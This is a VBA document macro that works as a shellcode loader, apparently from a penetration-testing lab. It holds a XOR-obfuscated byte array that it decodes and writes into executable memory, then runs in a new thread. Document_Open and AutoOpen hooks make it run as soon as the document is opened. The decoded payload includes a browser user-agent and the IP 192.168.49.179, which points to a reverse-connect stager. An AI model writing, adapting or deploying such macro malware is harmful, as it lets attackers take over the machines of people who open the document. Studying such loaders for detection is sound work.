Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
 Dim buf As Variant
 Dim addr As LongPtr
 Dim counter As Long
 Dim data As Long
 Dim res As Long
 

'see xor-vba-shellcode
buf = Array(169, 189, 218, 85, 85, 85, 53, 220, 176, 100, 135, 49, 222, 7, 101, 222, 7, 89, 222, 7, 65, 90, 226, 31, 115, 222, 39, 125, 100, 170, 100, 149, 249, 105, 52, 41, 87, 121, 117, 148, 154, 88, 84, 146, 28, 32, 186, 7, 222, _
7, 69, 222, 23, 105, 2, 84, 133, 222, 21, 45, 208, 149, 33, 25, 84, 133, 222, 13, 117, 222, 29, 77, 84, 134, 5, 208, 156, 33, 105, 100, 170, 28, 222, 97, 222, 84, 131, 100, 149, 148, 154, 88, 249, 84, 146, 109, 181, 32, _
161, 86, 40, 173, 110, 40, 113, 32, 181, 13, 222, 13, 113, 84, 134, 51, 222, 89, 30, 222, 13, 73, 84, 134, 222, 81, 222, 84, 133, 220, 17, 113, 113, 14, 14, 52, 12, 15, 4, 170, 181, 13, 10, 15, 222, 71, 188, 213, 170, _
170, 170, 8, 61, 59, 48, 33, 85, 61, 34, 60, 59, 60, 1, 61, 25, 34, 115, 82, 170, 128, 100, 142, 6, 6, 6, 6, 6, 189, 209, 85, 85, 85, 24, 58, 47, 60, 57, 57, 52, 122, 96, 123, 101, 117, 125, 2, 60, 59, _
49, 58, 34, 38, 117, 27, 1, 117, 100, 101, 123, 101, 110, 117, 2, 60, 59, 99, 97, 110, 117, 45, 99, 97, 124, 117, 20, 37, 37, 57, 48, 2, 48, 55, 30, 60, 33, 122, 96, 102, 98, 123, 102, 99, 117, 125, 30, 29, 1, _
24, 25, 121, 117, 57, 60, 62, 48, 117, 18, 48, 54, 62, 58, 124, 117, 22, 61, 39, 58, 56, 48, 122, 108, 109, 123, 101, 123, 97, 98, 96, 109, 123, 109, 100, 117, 6, 52, 51, 52, 39, 60, 122, 96, 102, 98, 123, 102, 99, _
117, 16, 49, 50, 122, 108, 98, 123, 101, 123, 100, 101, 98, 103, 123, 99, 108, 85, 61, 111, 3, 44, 242, 170, 128, 6, 6, 63, 86, 6, 6, 61, 238, 84, 85, 85, 189, 58, 84, 85, 85, 122, 13, 102, 51, 19, 36, 0, 102, _
97, 55, 44, 15, 31, 30, 16, 50, 37, 30, 57, 5, 13, 55, 50, 51, 54, 38, 16, 100, 12, 22, 17, 120, 5, 103, 27, 10, 39, 4, 36, 97, 32, 33, 35, 55, 58, 58, 27, 101, 24, 28, 20, 63, 36, 3, 62, 34, 30, _
56, 32, 101, 19, 54, 61, 60, 23, 1, 38, 50, 62, 101, 4, 5, 55, 59, 37, 18, 47, 33, 24, 7, 62, 54, 54, 2, 17, 2, 10, 56, 47, 16, 10, 39, 63, 15, 1, 60, 51, 4, 20, 0, 54, 35, 49, 109, 57, 13, _
7, 30, 2, 34, 57, 55, 3, 100, 61, 12, 57, 52, 0, 101, 36, 26, 56, 49, 15, 120, 36, 2, 96, 39, 48, 103, 5, 55, 36, 49, 25, 10, 108, 99, 38, 26, 5, 31, 1, 18, 37, 38, 54, 36, 7, 45, 33, 120, 27, _
38, 23, 38, 12, 2, 98, 0, 5, 1, 30, 24, 51, 12, 12, 37, 28, 63, 99, 61, 99, 60, 49, 16, 25, 45, 96, 17, 96, 35, 58, 2, 108, 96, 19, 120, 3, 4, 37, 15, 15, 98, 39, 55, 44, 32, 58, 39, 100, 17, _
98, 27, 59, 96, 36, 100, 20, 47, 27, 1, 57, 120, 109, 39, 57, 5, 37, 31, 120, 85, 5, 61, 2, 220, 202, 147, 170, 128, 220, 147, 6, 61, 85, 103, 189, 209, 6, 6, 6, 2, 6, 3, 61, 190, 0, 123, 110, 170, 128, _
195, 63, 95, 10, 61, 213, 102, 85, 85, 220, 181, 63, 81, 5, 63, 74, 3, 61, 32, 19, 203, 211, 170, 128, 6, 6, 6, 6, 3, 61, 120, 83, 77, 46, 170, 128, 208, 149, 32, 65, 61, 221, 70, 85, 85, 61, 17, 165, 96, _
181, 170, 128, 26, 32, 152, 189, 30, 85, 85, 85, 63, 21, 61, 85, 69, 85, 85, 61, 85, 85, 21, 85, 6, 61, 13, 241, 6, 176, 170, 128, 198, 6, 6, 220, 178, 2, 61, 85, 117, 85, 85, 6, 3, 61, 71, 195, 220, 183, _
170, 128, 208, 149, 33, 154, 222, 82, 84, 150, 208, 149, 32, 176, 13, 150, 10, 189, 62, 170, 170, 170, 100, 108, 103, 123, 100, 99, 109, 123, 97, 108, 123, 100, 98, 108, 85, 238, 181, 72, 127, 95, 61, 243, 192, 232, 200, 170, 128, _
105, 83, 41, 95, 213, 174, 181, 32, 80, 238, 18, 70, 39, 58, 63, 85, 6, 170, 128)


 Dim key As Byte
 key = &H55

 For i = 0 To UBound(buf)
  buf(i) = buf(i) Xor key
 Next i
 
 addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
 
 For counter = LBound(buf) To UBound(buf)
 data = buf(counter)
 res = RtlMoveMemory(addr + counter, data, 1)
 Next counter
 
 res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
 MyMacro
End Sub

Sub AutoOpen()
 MyMacro
End Sub

